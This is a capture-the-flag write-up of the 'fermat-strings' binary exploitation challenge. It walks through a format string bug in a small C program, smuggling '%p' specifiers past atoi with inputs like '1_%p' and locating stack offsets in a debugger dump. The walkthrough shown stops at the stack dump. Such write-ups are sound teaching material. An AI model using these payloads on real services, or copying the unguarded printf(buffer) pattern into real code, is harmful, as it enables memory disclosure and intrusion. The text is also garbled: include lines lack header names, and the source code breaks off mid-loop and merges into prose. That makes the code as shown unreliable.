# fermat-strings
Binary Exploitation, 250 points
## Description
> Fermat's last theorem solver as a service.
A binary file was attached, together with the source code:
```c
#include 
#include 
#include 
#include 
#include 
#define SIZE 0x100
int main(void)
{
  char A[SIZE];
  char B[SIZE];
  int a = 0;
  int b = 0;
  puts("Welcome to Fermat\\'s Last Theorem as a service");
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
  printf("A: ");
  read(0, A, SIZE);
  printf("B: ");
  read(0, B, SIZE);
  A[strcspn(A, "\n")] = 0;
  B[strcspn(B, "\n")] = 0;
  a = atoi(A);
  b = atoi(B);
  if(a == 0 || b == 0) {
    puts("Error: could not parse numbers!");
    return 1;
  }
  char buffer[SIZE];
  snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
  printf(buffer);
  int answer = -1;
  for(int i = 0; i  No three positive integers `a`, `b`, and `c` satisfy the equation `a^n + b^n = c^n` for any integer value of n greater than `2`.
It also sounds a lot like "format strings", which is the vulnerability we see in the code:
```c
snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B);
printf(buffer);
```
Since we control `A` and `B`, we can provide format specifiers in order to cause information leakage and memory writes.
Let's start with a naive example:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ ./chall
Welcome to Fermat\'s Last Theorem as a service
A: %p
B: %p
Error: could not parse numbers!
```
This fails. The reason is that when `atoi` gets an input such as `%p`, it is unable to convert it to a number. However, let's take a closer look at how `atoi` works:
> Parses the C-string str interpreting its content as an integral number, which is returned as a value of type int.
> 
> The function first discards as many whitespace characters (as in isspace) as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many base-10 digits as possible, and interprets them as a numerical value.
> 
> The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.
> 
> If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed and zero is returned.
> 
> ([Source](https://www.cplusplus.com/reference/cstdlib/atoi/))
So, we can smuggle in any string as long as we start with some valid number, for example:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/fermat-strings]
└─$ ./chall
Welcome to Fermat\'s Last Theorem as a service
A: 1_%p
B: 1_%x
Calculating for A: 1_0x400bd7 and B: 1_98d8fa14
```
Now that we know that we can trigger a format string attack, we should find the correct offset to allow the format specifier to read back a value provided by us. Essentially, we want to provide a set of addresses, and then format specifiers to dereference the addresses we've provide and read from / write to them. In a classic format string attack, both the addresses and the specifiers are provided in the format string together, and sent to `printf` as one string. However, since our addresses will contain `0x00` bytes, and since we must pass through `snprintf` in order to enable the format string vulnerability in `printf`, the naive approach won't suffice: `snprintf` will cut off anything after the first NULL byte it reaches, and the string passed to `snprintf` won't contain all of our payload. So, in our case, we will need to make sure that `printf` gets the format specifiers, but their offsets point to the original `A` or `B` which can contain as many NULL bytes as we want. In practice, we will provide the format specifiers in `A` and the addresses in `B`.
We start by running the program in the debugger, and setting a breakpoint right before the `printf`. We then provide the following input:
```
Welcome to Fermat\'s Last Theorem as a service
A: 1_%p.%p.%p.%p.%p.%p.%p.%p.%p
B: 1_ABCDEFGH
```
In `A`, we are leaking a few values to help us get oriented. In `B`, we are providing a marker to help us find the correct offset. We run and hit the breakpoint, then dump the stack:
```
gef>  stack 100
0x00007fffffffe550│+0x0000: 0x0000000000000000   ← $rsp
0x00007fffffffe558│+0x0008: 0x0000000000000000
0x00007fffffffe560│+0x0010: 0x0000000000000000
0x00007fffffffe568│+0x0018: 0x0000000100000001
0x00007fffffffe570│+0x0020: "1_%p.%p.%p.%p.%p.%p.%p.%p.%p"
0x00007fffffffe578│+0x0028: "%p.%p.%p.%p.%p.%p.%p"
0x00007fffffffe580│+0x0030: ".%p.%p.%p.%p"
0x00007fffffffe588│+0x0038: 0x0000000070252e70 ("p.%p"?)
0x00007fffffffe590│+0x0040: 0x0000000000000001
0x00007fffffffe598│+0x0048: 0x0000255499f1c4be
0x00007fffffffe5a0│+0x0050: 0x0000255499eea3a8
0x00007fffffffe5a8│+0x0058: 0x00007ffff7ffe180  →  0x0000000000000000
0x00007fffffffe5b0│+0x0060: 0x00007ffff7ffe180  →  0x0000000000000000
0x00007fffffffe5b8│+0x0068: 0x00007ffff7fe96b8  →   mov QWORD PTR [rip+0x14a45], 0x0        # 0x7ffff7ffe108 
0x00007fffffffe5c0│+0x0070: 0x00007fffffffe860  →  0x0000000000400ad0  →   push r15
0x00007fffffffe5c8│+0x0078: 0x00007ffff7fd6b1f  →   lea rsp, [rbp-0x28]
0x00007fffffffe5d0│+0x0080: 0x0000000000000000
0x00007fffffffe5d8│+0x0088: 0x0000000000000000
0x00007fffffffe5e0│+0x0090: 0x0000000000000000
0x00007fffffffe5e8│+0x0098: 0x0000000000000000
0x00007fffffffe5f0│+0x00a0: 0x00007ffff7ca8740  →  0x00007ffff7ca8740  →  [loop detected]
0x00007fffffffe5f8│+0x00a8: 0x00007ffff7ffe080  →  0x0000000000000001
0x00007fffffffe600│+0x00b0: 0x0000000000000000
0x00007fffffffe608│+0x00b8: 0x00007fffffffea01  →  0x2400007fffffffee
0x00007fffffffe610│+0x00c0: 0x00007ffff7ffe701  →  0x2000000000000000
0x00007fffffffe618│+0x00c8: 0x00007ffff7ffd9e8  →  0x00007ffff7fd2000  →  0x00010102464c457f
0x00007fffffffe620│+0x00d0: 0x00007fffffffe648  →  0x00007ffff7fd0218  →  0x000b001200000036 ("6"?)
0x00007fffffffe628│+0x00d8: 0x0000255499eea3a8
0x00007fffffffe630│+0x00e0: 0x0000000000000000
0x00007fffffffe638│+0x00e8: 0x0000000000000000
0x00007fffffffe640│+0x00f0: 0x0000000000000000
0x00007fffffffe648│+0x00f8: 0x00007ffff7fd0218  →  0x000b001200000036 ("6"?)
0x00007fffffffe650│+0x0100: 0x0000002000000000
0x00007fffffffe658│+0x0108: 0x0000000000000000
0x00007fffffffe660│+0x0110: 0x0000000000000000
0x00007fffffffe668│+0x0118: 0x0000000000000000
0x00007fffffffe670│+0x0120: "1_ABCDEFGH"         ← $r10
0x00007fffffffe678│+0x0128: 0x0000000103004847 ("GH"?)
0x00007fffffffe680│+0x0130: 0x0000000000000000
0x00007fffffffe688│+0x0138: 0x0000000000000000
0x00007fffffffe690│+0x0140: 0x0000000000000000
0x00007fffffffe698│+0x0148: 0x0000000000000000
0x00007fffffffe6a0│+0x0150: 0x0000000000000000
0x00007fffffffe6a8│+0x0158: 0x0000000000000000
0x00007fffffffe6b0│+0x0160: 0x0000000000000000
0x00007fffffffe6b8│+0x0168: 0x0000000000000000
0x00007fffffffe6c0│+0x0170: 0x0000000000000000
0x00007fffffffe6c8│+0x0178: 0x0000000000000000
0x00007fffffffe6d0│+0x0180: 0x0000000000000000
0x00007fffffffe6d8│+0x0188: 0x0000000000000000
0x00007fffffffe6e0│+0x0190: 0x0000000000000000
0x00007fffffffe6e8│+0x0198: 0x0000000000000000
0x00007fffffffe6f0│+0x01a0: 0x0000000000000000
0x00007fffffffe6f8│+0x01a8: 0x0000000000000000
0x00007fffffffe700│+0x01b0: 0x0000000000000000
0x00007fffffffe708│+0x01b8: 0x0000000000000000
0x00007fffffffe710│+0x01c0: 0x0000000000000000
0x00007fffffffe718│+0x01c8: 0x0000000000000000
0x00007fffffffe720│+0x01d0: 0x0000000000000000
0x00007fffffffe728│+0x01d8: 0x0000000000000000
0x00007fffffffe730│+0x01e0: 0x0000000000000000
0x00007fffffffe738│+0x01e8: 0x0000000000000000
0x00007fffffffe740│+0x01f0: 0x0000000000000000
0x00007fffffffe748│+0x01f8: 0x0000000000000000
0x00007fffffffe750│+0x0200: 0x0000000000000000
0x00007fffffffe758│+0x0208: 0x0000000000000000
0x00007fffffffe760│+0x0210: 0x0000000000000000
0x00007fffffffe768│+0x0218: 0x0000000000000000
0x00007fffffffe770│+0x0220: "Calculating for A: 1_%p.%p.%p.%p.%p.%p.%p.%p.%p an[...]"    ← $rdi
0x00007fffffffe778│+0x0228: "ing for A: 1_%p.%p.%p.%p.%p.%p.%p.%p.%p and B: 1_A[...]"
0x00007fffffffe780│+0x0230: "A: 1_%p.%p.%p.%p.%p.%p.%p.%p.%p and B: 1_ABCDEFGH\[...]"
0x00007fffffffe788│+0x0238: "%p.%p.%p.%p.%p.%p.%p.%p and B: 1_ABCDEFGH\n"
0x00007fffffffe790│+0x0240: ".%p.%p.%p.%p.%p and B: 1_ABCDEFGH\n"
0x00007fffffffe798│+0x0248: "p.%p.%p and B: 1_ABCDEFGH\n"
0x00007fffffffe7a0│+0x0250: "and B: 1_ABCDEFGH\n"
0x00007fffffffe7a8│+0x0258: "_ABCDEFGH\n"